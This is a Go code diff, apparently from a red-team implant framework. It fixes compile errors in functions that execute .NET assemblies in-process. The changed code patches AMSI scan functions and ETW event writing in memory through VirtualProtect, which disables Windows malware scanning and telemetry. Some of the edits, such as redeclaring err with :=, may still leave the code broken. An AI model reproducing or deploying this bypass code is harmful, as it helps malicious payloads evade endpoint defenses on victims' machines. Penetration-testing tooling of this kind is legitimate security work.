@@ -25,6 +25,8 @@ import (
 	// {{if .Config.Debug}}
 	"log"
 	// {{else}}{{end}}
+	"errors"
+	"fmt"
 	"os/exec"
 	"runtime"
 	"strings"
@@ -207,14 +209,14 @@ func getDotnetRutnimes() ([]string, error) {
 		// {{if .Config.Debug}}
 		log.Printf("could not create CLR instance: %v\n", err)
 		// {{end}}
-		return "", err
+		return nil, err
 	}
 	runtimes, err := clr.GetInstalledRuntimes(metaHost)
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("could not get installed runtimes: %v\n", err)
 		// {{end}}
-		return "", err
+		return nil, err
 	}
 	return runtimes, nil
 }
@@ -236,19 +238,19 @@ func InProcExecuteAssembly(assemblyBytes []byte, assemblyArgs []string, runtime 
 	if amsiBypass {
 		// load amsi.dll
 		amsiDLL := windows.NewLazyDLL("amsi.dll")
-		amsiScanBuffer = amsiDLL.NewProc("AmsiScanBuffer")
-		amsiInitialize = amsiDLL.NewProc("AmsiInitialize")
-		amsiScanString = amsiDLL.NewProc("AmsiScanString")
+		amsiScanBuffer := amsiDLL.NewProc("AmsiScanBuffer")
+		amsiInitialize := amsiDLL.NewProc("AmsiInitialize")
+		amsiScanString := amsiDLL.NewProc("AmsiScanString")
 
 		// patch
 		amsiAddr := []uintptr{
-			amsiSCanBuffer.Addr(),
+			amsiScanBuffer.Addr(),
 			amsiInitialize.Addr(),
 			amsiScanString.Addr(),
 		}
 		for _, addr := range amsiAddr {
 			var oldProtect uint32
-			err = windows.VirtualProtect(addr, 1, windows.PAGE_READWRITE, &oldProtect)
+			err := windows.VirtualProtect(addr, 1, windows.PAGE_READWRITE, &oldProtect)
 			if err != nil {
 				//{{if .Config.Debug}}
 				log.Println("VirtualProtect failed:", err)
@@ -271,7 +273,7 @@ func InProcExecuteAssembly(assemblyBytes []byte, assemblyArgs []string, runtime 
 
 		// patch
 		var oldProtect uint32
-		err = windows.VirtualProtect(etwEventWriteProc.Addr(), 1, windows.PAGE_READWRITE, &oldProtect)
+		err := windows.VirtualProtect(etwEventWriteProc.Addr(), 1, windows.PAGE_READWRITE, &oldProtect)
 		if err != nil {
 			//{{if .Config.Debug}}
 			log.Println("VirtualProtect failed:", err)
@@ -287,7 +289,7 @@ func InProcExecuteAssembly(assemblyBytes []byte, assemblyArgs []string, runtime 
 			return "", err
 		}
 	}
-	err = clr.RedirectStdoutStderr()
+	err := clr.RedirectStdoutStderr()
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("could not redirect stdout/stderr: %v\n", err)
